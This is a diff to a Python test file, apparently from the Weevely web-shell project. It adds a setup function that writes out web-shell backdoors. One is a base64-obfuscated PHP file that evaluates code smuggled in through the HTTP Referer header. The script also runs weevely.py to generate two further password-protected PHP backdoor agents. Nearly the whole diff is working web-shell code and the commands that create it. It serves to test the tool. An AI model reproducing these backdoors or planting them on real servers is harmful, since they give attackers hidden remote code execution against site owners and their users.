@@ -14,6 +14,21 @@ import tempfile
 import core.config
 import socket
 
+def setUpModule():
+    subprocess.check_output("""
+BASE_FOLDER="{config.base_folder}/test_channels/"
+PWD="{config.password}"
+mkdir -p "$BASE_FOLDER"
+echo "<?php eval(base64_decode('cGFyc2Vfc3RyKCRfU0VSVkVSWy\
+dIVFRQX1JFRkVSRVInXSwkYSk7IGlmKHJlc2V0KCRhKT09J2FzJyAmJiBj\
+b3VudCgkYSk9PTkpIHsgZWNobyAnPGRhc2Q+JztldmFsKGJhc2U2NF9kZWN\
+vZGUoc3RyX3JlcGxhY2UoIiAiLCAiKyIsIGpvaW4oYXJyYXlfc2xpY2UoJGE\
+sY291bnQoJGEpLTMpKSkpKTtlY2hvICc8L2Rhc2Q+Jzt9')); ?>" > "$BASE_FOLDER/legacyreferrer.php"
+python ./weevely.py generate -agent stegaref_php_debug "$PWD" "$BASE_FOLDER/stegaref_php_debug.php"
+python ./weevely.py generate -agent legacycookie_php "$PWD" "$BASE_FOLDER/legacycookie_php.php"
+""".format(
+config = config
+), shell=True)
 
 def _get_google_ip():
     try:
